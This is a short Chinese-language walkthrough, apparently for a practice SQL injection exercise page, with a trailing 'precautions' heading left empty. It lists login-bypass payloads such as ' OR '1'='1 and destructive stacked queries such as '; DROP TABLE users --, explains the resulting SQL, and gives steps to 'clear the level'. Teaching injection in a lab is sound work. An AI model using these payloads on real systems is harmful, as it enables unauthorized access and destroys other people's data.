SQL注入通关教程

如何登录

在用户名框输入以下任一语句，密码随意：

  • ' OR '1'='1
  • admin' --
  • ' OR 1=1 --

原理：这些语句会让SQL查询变成：

        SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '任意密码'

'1'='1' 永远成立，-- 注释掉后面的密码验证，所以成功登录。

如何删库

在用户名或密码框输入以下语句：

  • '; DROP TABLE users --
  • DROP TABLE users
  • DROP DATABASE test

原理：

        SELECT * FROM users WHERE username = ''; DROP TABLE users --' AND password = '任意密码'

; 结束前面的查询，然后执行 DROP TABLE 删除数据表。

通关步骤

  1. 在登录页用户名输入 ' OR '1'='1，密码任意
  2. 点击登录，自动跳转到 q.html
  3. 点击"退登"返回
  4. 在登录页输入 DROP TABLE users，点击登录
  5. 看到"操作已执行"，删库成功

注意事项
